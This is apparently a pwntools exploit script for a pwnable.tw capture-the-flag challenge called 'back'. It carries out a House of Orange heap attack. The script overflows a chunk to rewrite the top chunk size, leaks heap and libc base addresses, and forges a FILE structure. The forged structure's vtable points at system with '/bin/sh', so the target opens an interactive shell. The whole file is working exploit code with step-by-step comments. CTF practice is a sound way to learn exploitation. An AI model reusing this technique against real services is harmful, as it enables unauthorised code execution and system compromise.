from pwn import *
io=process("./back",env={"LD_PRELOAD":"./libc_64.so.6"})
#io=remote("chall.pwnable.tw",10304)
io.sendafter("Author :","a"*64)

def add(size,data):
    io.sendlineafter("Your choice :","1")
    io.sendlineafter("Size of page :",str(size))
    io.sendafter("Content :",data)

def view(idx):
    io.sendlineafter("Your choice :","2")
    io.sendlineafter("Index of page :",str(idx))


def edit(idx,data):
    io.sendlineafter("Your choice :","3")
    io.sendlineafter("Index of page :",str(idx))
    io.sendafter("Content:",data)

def auth():
    io.sendlineafter("Your choice :","4")


add(40,"b"*40)               # chunk to use for overflowing

edit(0,"c"*40)              # current size will be overwritten with new size which will be 3 bytes extra due to top chunk size
edit(0,"c"*40+"\xd1\x0f\x00")    # overwrite the top chunk size with 0xfd0 so it will be page aligned
add(0x1000,"aa")                # invoking _int_free to free the top chunk
add(0x400,"aaaaaaaa")          # adding a chunk to get the leak
auth()
io.recvuntil("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")   # heap leak from the array stored on the bss
heap_leak=u64(io.recv(4)+"\x00"*4)-0x10
io.sendlineafter("Do you want to change the author ? (yes:1 / no:0) ","0")

view(2)
io.recvuntil("aaaaaaaa")

libc_leak = u64(io.recv(6)+"\x00\x00")-0x3c4188

IO_list_all = libc_leak + 0x3c4520 -0x10

system=libc_leak+0x45390

log.info("Heap base @ "+str(hex(heap_leak)))
log.info("Libc base @ "+str(hex(libc_leak)))
log.info("IO_list_all @ "+str(hex(IO_list_all)))
log.info("system @ "+str(hex(system)))

edit(0,"\x00")     # making the size of 0th chunk as 0 so as to get an extra 9th chunk

vtable=heap_leak+0x5f8
addr=heap_leak+0x5d0

for i  in range(6):
    add(0x10,"a"*5)

payload="\x00"*0x4f0

payload+="/bin/sh\x00"+p64(0x61)+p64(0xdeadbeef)+p64(IO_list_all)
payload+=p64(0)*16
payload+=p64(addr)
payload+=p64(0)*3
payload+=p64(1)+p64(0)*2
payload+=p64(vtable)
payload+=p64(1)+p64(2)+p64(3)
payload+=p64(0)*3+p64(system)
edit(0,payload)
#gdb.attach(io)

io.interactive()
